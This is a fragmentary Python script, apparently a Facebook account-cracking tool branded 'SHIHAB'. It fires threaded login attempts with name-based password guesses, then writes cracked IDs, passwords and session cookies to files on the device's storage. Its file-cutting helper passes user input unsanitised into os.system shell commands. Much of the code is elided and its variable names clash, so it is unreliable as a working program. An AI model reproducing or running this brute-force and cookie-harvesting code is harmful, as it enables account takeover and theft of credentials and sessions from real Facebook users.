...
def Shihab():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://wa.me/qr/MKL2FBU5HA3SH1')
        pass
    elif select =='F':
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SHIHABb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SHIHABb};{ckkk}"
                    print(f"\r{R} [SHIHAB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SHIHAB_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SHIHAB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SHIHAB-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SHIHAB_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SHIHAB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SHIHAB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SHIHAB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SHIHAB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SHIHAB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SHIHAB_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with ShihabSHIHAB(max_workers=30) as SHIHABworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SHIHABworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SHIHABworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SHIHABworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SHIHABworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
...
def cutter():
    ...
    print(" ")
    Shihab = input('Saving Put File Name :')
    os.system('touch ' +Shihab)
    os.system('sort -r '+SHIHAB+' | uniq > '+Shihab)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + SHIHAB )
    print(47*'-')
    print("File Saved To :" + Shihab )
    print(47*'-')
